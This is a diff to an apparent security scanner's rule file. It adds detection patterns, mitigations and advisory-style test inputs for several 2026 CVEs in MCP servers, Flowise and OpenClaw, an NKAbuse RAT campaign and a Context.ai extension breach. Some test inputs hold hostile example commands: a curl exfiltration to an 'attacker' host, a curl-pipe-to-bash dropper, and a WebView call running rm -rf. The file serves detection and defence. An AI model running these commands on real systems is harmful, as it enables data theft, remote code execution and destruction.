@@ -1,4 +1,4 @@
-version: "2026.04.23.1"
+version: "2026.04.23.2"
 static_rules:
   - id: MAL-001
     category: malware_pattern
@@ -12482,6 +12482,482 @@ static_rules:
 
       - https://dev.to/armor1ai/how-to-check-your-mcp-server-for-cve-2026-5603s-vulnerability-pattern-and-why-shellquote-isnt-gdn
       - https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/
+    test_expect: fires
+  - id: PSV-032
+    category: platform_security
+    severity: high
+    confidence: 0.9
+    title: mcp-server-kubernetes kubectl argument injection RCE (CVE-2026-39884, <= 3.4.0)
+    pattern: '(?i)(?:CVE-2026-39884|mcp[_\s-]?server[_\s-]?kubernetes[^\n]{0,200}(?:port[_\s-]?forward|argument[_\s-]?inject|cve-2026-39884|3\.[0-4]\.\d+\b|<=\s*3\.4\.0|--address=0\.0\.0\.0)|flux159[_\s/-]mcp[_\s-]?server[_\s-]?kubernetes|port[_\s-]?forward[^\n]{0,120}(?:kubectl[^\n]{0,40}(?:concat|\$\{|split\s*\(\s*["'']\s+["''])|spawn[^\n]{0,40}split|--address=0\.0\.0\.0)|kubectl[^\n]{0,80}(?:string[_\s-]?concat|split\s*\(\s*["'']\s+["''])[^\n]{0,80}(?:namespace|resourceType|resourceName|localPort|targetPort))'
+    mitigation: 'CVE-2026-39884 (CVSS 8.3, CWE-88) is an argument injection vulnerability in mcp-server-kubernetes <= 3.4.0. The port_forward tool in src/tools/port_forward.ts constructs a kubectl command via string concatenation with user-controlled fields (namespace, resourceType, resourceName, localPort, targetPort) and naively splits on spaces before passing to spawn(). Every other tool in the codebase uses array-based argument passing via execFileSync(); port_forward is the odd one out. An attacker can inject arbitrary kubectl flags — notably --address=0.0.0.0 to expose internal services, additional -n flags for cross-namespace targeting, or indirect exploitation via prompt injection against AI agents connected to the MCP server. Upgrade to version 3.5.0 or later.'
+    metadata:
+      version: 1.0.0
+      status: active
+      author: skillscan
+      created: '2026-04-23'
+      updated: '2026-04-23'
+      tags:
+        - platform_security
+        - psv
+        - mcp_server
+        - kubernetes
+        - argument_injection
+        - cve-2026-39884
+      last_modified: '2026-04-23'
+      techniques:
+        - id: PSV-032
+          name: Platform security vulnerability
+      applies_to:
+        contexts:
+          - source
+          - dependency
+          - workflow
+      lifecycle:
+        introduced: '2026-04-23'
+        last_modified: '2026-04-23'
+      quality:
+        precision_estimate: 0.9
+        benchmark_set: core-static-v1
+      references:
+        - https://nvd.nist.gov/vuln/detail/CVE-2026-39884
+        - https://github.com/advisories/GHSA-search?q=CVE-2026-39884
+        - https://radar.offseq.com/threat/cve-2026-39884-cwe-88-improper-neutralization-of-a-0e46c7ee
+    test_input: |
+      ---
+      name: k8s-mcp-helper
+      description: Kubernetes MCP server integration with port-forwarding
+      ---
+
+      # CVE-2026-39884 — mcp-server-kubernetes port_forward Argument Injection
+
+      This advisory documents CVE-2026-39884, an argument injection vulnerability
+      in the port_forward tool of mcp-server-kubernetes versions <= 3.4.0.
+
+      ## Vulnerable Pattern
+
+      In `src/tools/port_forward.ts`, the port_forward tool string-concatenates
+      user-controlled fields into a kubectl command, then splits on whitespace
+      before calling spawn():
+
+      ```typescript
+      const cmd = `kubectl port-forward -n ${namespace} ${resourceType}/${resourceName} ${localPort}:${targetPort}`;
+      spawn('sh', ['-c', cmd]);
+      ```
+
+      Any space in namespace / resourceType / resourceName / localPort /
+      targetPort becomes a new kubectl argument. An attacker can inject
+      `--address=0.0.0.0` to expose internal services, or additional `-n`
+      flags for cross-namespace targeting.
+
+      ## Dependency
+
+      ```json
+      { "dependencies": { "mcp-server-kubernetes": "3.4.0" } }
+      ```
+
+      ## Fix
+
+      Upgrade to 3.5.0+. The patched port_forward uses execFileSync with an
+      argv array, matching the rest of the codebase.
+    test_expect: fires
+  - id: PSV-033
+    category: platform_security
+    severity: high
+    confidence: 0.9
+    title: mcp-framework HTTP server DoS via unbounded POST body (CVE-2026-39313, <= 0.2.21)
+    pattern: '(?i)(?:CVE-2026-39313|mcp[_\s-]?framework[^\n]{0,200}(?:readRequestBody|unbounded|dos[^\n]{0,20}(?:post|memory|exhaust)|cve-2026-39313|0\.2\.[0-9]{1,2}\b[^\n]{0,40}(?:readRequestBody|dos|inject|vuln|cve)|<=\s*0\.2\.21)|readRequestBody[^\n]{0,120}(?:mcp|unbounded|size[_\s-]?limit|memory[_\s-]?exhaust|maxMessageSize)|quantgeekdev[_\s/-]mcp[_\s-]?framework)'
+    mitigation: 'CVE-2026-39313 (CWE-770) is an unauthenticated denial-of-service vulnerability in mcp-framework <= 0.2.21. The readRequestBody() function in src/transports/http/server.ts concatenates HTTP request body chunks into a single string with no size limit. A maxMessageSize config value exists but is never enforced. A remote unauthenticated attacker can crash any mcp-framework HTTP server by sending a single large POST request to /mcp, causing memory exhaustion. Upgrade to version 0.2.22 or later, or front the server with a reverse proxy that enforces request size limits.'
+    metadata:
+      version: 1.0.0
+      status: active
+      author: skillscan
+      created: '2026-04-23'
+      updated: '2026-04-23'
+      tags:
+        - platform_security
+        - psv
+        - mcp_server
+        - denial_of_service
+        - cve-2026-39313
+      last_modified: '2026-04-23'
+      techniques:
+        - id: PSV-033
+          name: Platform security vulnerability
+      applies_to:
+        contexts:
+          - source
+          - dependency
+          - workflow
+      lifecycle:
+        introduced: '2026-04-23'
+        last_modified: '2026-04-23'
+      quality:
+        precision_estimate: 0.9
+        benchmark_set: core-static-v1
+      references:
+        - https://nvd.nist.gov/vuln/detail/CVE-2026-39313
+        - https://advisories.gitlab.com/npm/mcp-framework/CVE-2026-39313/
+    test_input: |
+      ---
+      name: mcp-framework-http-server
+      description: HTTP transport for MCP server using mcp-framework
+      ---
+
+      # CVE-2026-39313 — mcp-framework readRequestBody Unbounded DoS
+
+      mcp-framework versions <= 0.2.21 are vulnerable to denial of service via
+      an unbounded POST body. The readRequestBody() function in
+      `src/transports/http/server.ts` concatenates request body chunks into a
+      string with no size limit enforcement. A single large POST to /mcp
+      crashes the server via memory exhaustion.
+
+      ## Dependency
+
+      ```json
+      {
+        "dependencies": { "mcp-framework": "0.2.21" }
+      }
+      ```
+
+      ## Reproduction
+
+      ```bash
+      curl -X POST -H "Content-Type: application/json" \
+           --data "@huge_payload.json" \
+           http://target.example.com/mcp
+      ```
+
+      Even though the framework exposes a `maxMessageSize` option, it is
+      never consulted in readRequestBody — the size limit is not enforced.
+
+      ## Fix
+
+      Upgrade mcp-framework to 0.2.22 or later.
+    test_expect: fires
+  - id: PSV-034
+    category: platform_security
+    severity: high
+    confidence: 0.9
+    title: OpenClaw WebView JavascriptInterface RCE (CVE-2026-35643, < 2026.3.22)
+    pattern: '(?i)(?:CVE-2026-35643|openclaw[^\n]{0,200}(?:webview[_\s-]?(?:javascript|js)[_\s-]?interface|canvas[_\s-]?(?:screen|bridge|action[_\s-]?trust)|window\.openclaw\.|cve-2026-35643|2026\.3\.(?:1[0-9]|2[01])\b[^\n]{0,40}(?:webview|javascriptinterface|rce|cve))|CanvasScreen\.kt|CanvasActionTrust\.kt|window\.openclaw\.[a-z][a-zA-Z0-9_]+\s*\(|addJavascriptInterface[^\n]{0,120}(?:openclaw|canvas|untrusted|origin))'
+    mitigation: 'CVE-2026-35643 is a critical RCE vulnerability in OpenClaw prior to version 2026.3.22. The Android component exposes a WebView JavascriptInterface bridge via CanvasScreen.kt without validating the origin of loaded pages — any page (including untrusted external URLs or injected content) can invoke the bridge via `window.openclaw.*` methods, achieving arbitrary code execution within the Android application context. The fix (commit 8b02ef133275be96d8aac2283100016c8a7f32e5, released in 2026.3.22) introduces CanvasActionTrust.kt, which centralises origin-based allow-listing and rejects calls from untrusted origins. Upgrade OpenClaw to 2026.3.22 or later; if upgrade is not immediately possible, disable WebView components that expose JavascriptInterface methods.'
+    metadata:
+      version: 1.0.0
+      status: active
+      author: skillscan
+      created: '2026-04-23'
+      updated: '2026-04-23'
+      tags:
+        - platform_security
+        - psv
+        - openclaw
+        - webview
+        - javascript_interface
+        - android
+        - rce
+        - cve-2026-35643
+      last_modified: '2026-04-23'
+      techniques:
+        - id: PSV-034
+          name: Platform security vulnerability
+      applies_to:
+        contexts:
+          - source
+          - workflow
+      lifecycle:
+        introduced: '2026-04-23'
+        last_modified: '2026-04-23'
+      quality:
+        precision_estimate: 0.9
+        benchmark_set: core-static-v1
+      references:
+        - https://www.sentinelone.com/vulnerability-database/cve-2026-35643/
+        - https://github.com/jgamblin/OpenClawCVEs
+    test_input: |
+      ---
+      name: openclaw-mobile-companion
+      description: OpenClaw Android canvas integration helper
+      ---
+
+      # CVE-2026-35643 — OpenClaw WebView JavascriptInterface RCE
+
+      OpenClaw versions prior to 2026.3.22 ship an Android WebView component
+      (CanvasScreen.kt) that exposes a JavascriptInterface bridge without
+      validating the origin of the page loaded in the WebView.
+
+      ## Attack Pattern
+
+      Any page loaded in the OpenClaw canvas WebView — including untrusted
+      external URLs or attacker-injected content — can invoke bridge methods
+      such as `window.openclaw.*` and achieve arbitrary code execution inside
+      the application's Android process:
+
+      ```html
+      <script>
+        window.openclaw.runShell("rm -rf /sdcard/Android/data/com.openclaw");
+      </script>
+      ```
+
+      ## Version
+
+      - Affected: OpenClaw < 2026.3.22
+      - Fixed: 2026.3.22 (commit 8b02ef133275be96d8aac2283100016c8a7f32e5)
+      - Fix file: CanvasActionTrust.kt (origin allowlist)
+
+      ## Remediation
+
+      Upgrade to OpenClaw 2026.3.22+. If you cannot upgrade immediately,
+      disable WebView components that expose JavascriptInterface methods via
+      addJavascriptInterface.
+    test_expect: fires
+  - id: PSV-035
+    category: platform_security
+    severity: critical
+    confidence: 0.95
+    title: Flowise authenticated RCE via MCP adapter STDIO command injection (CVE-2026-40933, < 3.1.0)
+    pattern: '(?i)(?:CVE-2026-40933|GHSA-c9gw-hvqq-f33r|flowise[^\n]{0,200}(?:mcp[_\s-]?adapter|stdio[_\s-]?command|authenticated[_\s-]?rce|cve-2026-40933|<\s*3\.1\.0|unsafe[_\s-]?serializ)|flowiseai[_\s/-]flowise[^\n]{0,80}(?:mcp|stdio|rce)|mcp[_\s-]?adapter[^\n]{0,120}(?:flowise|stdio|unsafe[_\s-]?serializ|arbitrary[_\s-]?command))'
+    mitigation: 'CVE-2026-40933 (GHSA-c9gw-hvqq-f33r, CVSS 10.0 Critical) is an authenticated RCE vulnerability in Flowise prior to version 3.1.0. Due to unsafe serialization of stdio commands in the MCP adapter, an authenticated attacker can add an MCP stdio server entry with an arbitrary command, achieving command execution in the Flowise server context. Low privileges required, no user interaction needed. Upgrade Flowise to 3.1.0 or later immediately; this is being actively exploited in the wild.'
+    metadata:
+      version: 1.0.0
+      status: active
+      author: skillscan
+      created: '2026-04-23'
+      updated: '2026-04-23'
+      tags:
+        - platform_security
+        - psv
+        - flowise
+        - mcp_adapter
+        - stdio_injection
+        - rce
+        - cve-2026-40933
+        - actively_exploited
+      last_modified: '2026-04-23'
+      techniques:
+        - id: PSV-035
+          name: Platform security vulnerability
+      applies_to:
+        contexts:
+          - source
+          - dependency
+          - workflow
+      lifecycle:
+        introduced: '2026-04-23'
+        last_modified: '2026-04-23'
+      quality:
+        precision_estimate: 0.95
+        benchmark_set: core-static-v1
+      references:
+        - https://github.com/advisories/GHSA-c9gw-hvqq-f33r
+        - https://nvd.nist.gov/vuln/detail/CVE-2026-40933
+        - https://cybersecuritynews.com/flowise-vulnerability/
+    test_input: |
+      ---
+      name: flowise-mcp-adapter
+      description: Flowise MCP adapter integration
+      ---
+
+      # CVE-2026-40933 — Flowise MCP Adapter STDIO RCE
+
+      Flowise prior to 3.1.0 is vulnerable to an authenticated RCE
+      (CVSS 10.0, GHSA-c9gw-hvqq-f33r) via unsafe serialization of stdio
+      commands in the MCP adapter. Any authenticated user with MCP server
+      administration privileges can add an MCP stdio server whose command
+      is arbitrary shell input, which is then passed to spawn in the
+      Flowise server process.
+
+      ## Dependency
+
+      ```json
+      {
+        "dependencies": { "flowise": "3.0.0" }
+      }
+      ```
+
+      ## Exploit Outline
+
+      ```bash
+      curl -X POST http://flowise.example/api/v1/mcp/add-server \
+           -H "Authorization: Bearer $FLOWISE_TOKEN" \
+           -H "Content-Type: application/json" \
+           -d '{"transport":"stdio","command":"bash -c \"id > /tmp/pwn && curl http://attacker/exfil -d @/tmp/pwn\""}'
+      ```
+
+      Because the stdio command string is serialized into a spawn call
+      without sanitisation, the attacker achieves unauthenticated-adjacent
+      RCE once they have a low-privilege Flowise account.
+
+      ## Remediation
+
+      Upgrade Flowise to 3.1.0 or later immediately.
+    test_expect: fires
+  - id: MAL-070
+    category: malware_pattern
+    severity: critical
+    confidence: 0.95
+    title: NKAbuse RAT via Hugging Face Spaces typosquat (vsccode-modetx / kagent)
+    pattern: '(?i)(?:nkabuse|NKAbuse|kagent[^\n]{0,80}(?:install[_-]linux\.sh|huggingface|hf\.co|huggingface\.co|spaces|nkn|systemd|launchagent|persistence|cron)|vsccode[_-]?modetx|huggingface\.co/spaces/[^\s/]{1,60}/vsccode[_-]?modetx|install[_-]linux\.sh[^\n]{0,80}(?:kagent|nkabuse|huggingface|hf\.co|curl|wget)|NKN[^\n]{0,80}(?:c2|p2p|kagent|nkabuse|persistence)|CVE-2026-39987[^\n]{0,120}(?:marimo|huggingface|kagent|nkabuse))'
+    mitigation: 'NKAbuse RAT campaign (Sysdig / BleepingComputer, April 2026) delivered via a typosquatted Hugging Face Space `vsccode-modetx` (impersonating VS Code). The exploitation chain begins with CVE-2026-39987 in Marimo reactive notebooks, which is used to execute a curl command that pulls `install-linux.sh` from the Hugging Face Space. The dropper downloads a binary named `kagent` (mimicking the legitimate Kubernetes AI agent), installs it locally, and sets up persistence via systemd, cron, or macOS LaunchAgent. The payload is a previously undocumented variant of the NKAbuse DDoS malware family, using NKN (decentralized P2P) for command-and-control. Remove any `kagent` binary not sourced from the legitimate Kubernetes project, audit systemd/cron/LaunchAgent entries for unknown scheduled scripts, and block outbound NKN traffic. Block the Hugging Face Space `huggingface.co/spaces/*/vsccode-modetx`.'
+    metadata:
+      version: 1.0.0
+      status: active
+      author: skillscan
+      created: '2026-04-23'
+      updated: '2026-04-23'
+      tags:
+        - malware_pattern
+        - mal
+        - nkabuse
+        - rat
+        - huggingface
+        - typosquat
+        - nkn
+        - cross-platform
+        - cve-2026-39987
+      last_modified: '2026-04-23'
+      techniques:
+        - id: MAL-070
+          name: Malware or malicious behavior
+      applies_to:
+        contexts:
+          - source
+          - workflow
+      lifecycle:
+        introduced: '2026-04-23'
+        last_modified: '2026-04-23'
+      quality:
+        precision_estimate: 0.95
+        benchmark_set: core-static-v1
+      references:
+        - https://www.bleepingcomputer.com/news/security/hackers-exploit-marimo-flaw-to-deploy-nkabuse-malware-from-hugging-face/
+        - https://www.sysdig.com/blog/cve-2026-39987-update-how-attackers-weaponized-marimo-to-deploy-a-blockchain-botnet-via-huggingface
+    test_input: |
+      # NKAbuse RAT — Hugging Face vsccode-modetx / kagent Campaign
+
+      Sysdig and BleepingComputer disclosed in April 2026 a campaign that
+      abuses CVE-2026-39987 in Marimo to deploy a new NKAbuse variant from a
+      typosquatted Hugging Face Space.
+
+      ## Delivery Chain
+
+      After Marimo RCE (CVE-2026-39987), attackers execute:
+
+      ```bash
+      curl -sL https://huggingface.co/spaces/attacker42/vsccode-modetx/resolve/main/install-linux.sh | bash
+      ```
+
+      The dropper `install-linux.sh` downloads the RAT binary `kagent`
+      (typosquatting the legitimate Kubernetes AI agent), installs it, and
+      configures persistence:
+
+      - Linux: systemd user unit + cron job
+      - macOS: LaunchAgent plist
+
+      ## Command-and-Control
+
+      kagent uses NKN (decentralized blockchain-based P2P overlay) for C2,
+      avoiding classic DNS / HTTP IOCs. DDoS modules and credential-stealer
+      modules are loaded at runtime.
+
+      ## Indicators of Compromise
+
+      - Hugging Face Space slug: `vsccode-modetx`
+      - Dropper: `install-linux.sh` (served from the HF Space)
+      - RAT binary: `kagent`
+      - Protocol: NKN P2P
+      - Initial RCE: CVE-2026-39987 (Marimo)
+
+      ## Remediation
+
+      Block Hugging Face Space `huggingface.co/spaces/*/vsccode-modetx`,
+      remove any `kagent` binary not from the official Kubernetes project,
+      and audit systemd, cron, and LaunchAgent entries for attacker-added
+      persistence.
+    test_expect: fires
+  - id: SUP-038
+    category: supply_chain
+    severity: high
+    confidence: 0.9
+    title: Context.ai Chrome extension supply chain compromise (Vercel breach, April 2026)
+    pattern: '(?i)(?:omddlmnhcofjbnbflmjginpjjblphbgk|context[\s._-]?ai[^\n]{0,200}(?:chrome[_\s-]?extension|oauth[_\s-]?(?:grant|scope|allow[_\s-]?all)|vercel[_\s-]?breach|lumma[_\s-]?stealer|shinyhunters)|chrome[_\s-]?extension[^\n]{0,80}(?:context[\s._-]?ai|omddlmnhcofjbnbflmjginpjjblphbgk)|vercel[^\n]{0,120}(?:context[\s._-]?ai|oauth[_\s-]?grant|allow[_\s-]?all|shinyhunters|supply[_\s-]?chain[_\s-]?compromise)|shinyhunters[^\n]{0,80}(?:vercel|context[\s._-]?ai))'
+    mitigation: 'The Context.ai Chrome extension (ID: omddlmnhcofjbnbflmjginpjjblphbgk) was the pivot point in the April 2026 Vercel supply-chain breach. A Context.ai employee was compromised with Lumma Stealer in February 2026; the stolen credentials were used to escalate into Context.ai''s production Google Workspace. Because at least one Vercel employee had signed up for the Context AI Office Suite using their enterprise Google account and granted "Allow All" OAuth permissions, the attacker pivoted from Context.ai''s environment into Vercel''s enterprise Google Workspace. A ShinyHunters persona has claimed responsibility (asking price $2M). Google removed the extension from the Chrome Web Store on 2026-03-27. Remediation: uninstall the Context.ai Chrome extension from every managed browser, revoke all OAuth grants to `context.ai` in Google Workspace admin, and audit Google Drive access logs for anomalous Context.ai activity between 2026-02-01 and 2026-04-19.'
+    metadata:
+      version: 1.0.0
+      status: active
+      author: skillscan
+      created: '2026-04-23'
+      updated: '2026-04-23'
+      tags:
+        - supply_chain
+        - sup
+        - chrome_extension
+        - oauth
+        - google_workspace
+        - vercel
+        - context_ai
+        - lumma_stealer
+        - shinyhunters
+      last_modified: '2026-04-23'
+      techniques:
+        - id: SUP-038
+          name: Supply Chain Compromise via Package Manager
+      applies_to:
+        contexts:
+          - source
+          - dependency
+          - workflow
+      lifecycle:
+        introduced: '2026-04-23'
+        last_modified: '2026-04-23'
+      quality:
+        precision_estimate: 0.9
+        benchmark_set: core-static-v1
+      references:
+        - https://thehackernews.com/2026/04/vercel-breach-tied-to-context-ai-hack.html
+        - https://vercel.com/kb/bulletin/vercel-april-2026-security-incident
+        - https://www.ox.security/blog/vercel-context-ai-supply-chain-attack-breachforums/
+    test_input: |
+      # Context.ai Chrome Extension Supply Chain Compromise — Vercel Breach
+
+      This advisory documents the April 19, 2026 Vercel security incident,
+      which originated in a compromised third-party AI tool used by Vercel
+      employees: the Context.ai Chrome extension.
+
+      ## Timeline
+
+      - 2026-02: Context.ai employee compromised by Lumma Stealer
+      - 2026-03-27: Google removes the Context.ai Chrome extension
+        (ID: omddlmnhcofjbnbflmjginpjjblphbgk) from the Chrome Web Store
+      - 2026-04-19: Vercel discloses the breach
+      - ShinyHunters persona claims the data, asking $2M
+
+      ## Attack Chain
+
+      1. Lumma Stealer on a Context.ai engineer machine exfiltrates SSO
+         credentials.
+      2. Attacker pivots into Context.ai's production Google Workspace.
+      3. At least one Vercel employee had installed the Context.ai Chrome
+         extension and authorised the OAuth grant with "Allow All"
+         permissions.
+      4. Because Vercel's internal OAuth configuration permitted broad
+         scopes, the attacker used the Context.ai OAuth grant to pivot
+         into Vercel's enterprise Google Workspace.
+      5. Google Drive contents and limited customer data were exfiltrated.
+
+      ## Indicators
+
+      - Chrome extension ID: `omddlmnhcofjbnbflmjginpjjblphbgk`
+      - Threat actor persona: ShinyHunters
+      - Stealer used: Lumma Stealer
+      - Pivot mechanism: OAuth "Allow All" grant through Context.ai extension
+
+      ## Remediation
+
+      1. Uninstall the Context.ai Chrome extension from every managed browser.
+      2. Revoke every OAuth grant to `context.ai` in Google Workspace admin.
+      3. Audit Google Drive access logs for anomalous Context.ai activity
+         between 2026-02-01 and 2026-04-19.
+      4. Rotate any credentials stored in Google Drive documents.
     test_expect: fires
 capability_patterns:
   shell_execution: \b(subprocess|os\.system|bash|powershell)\b
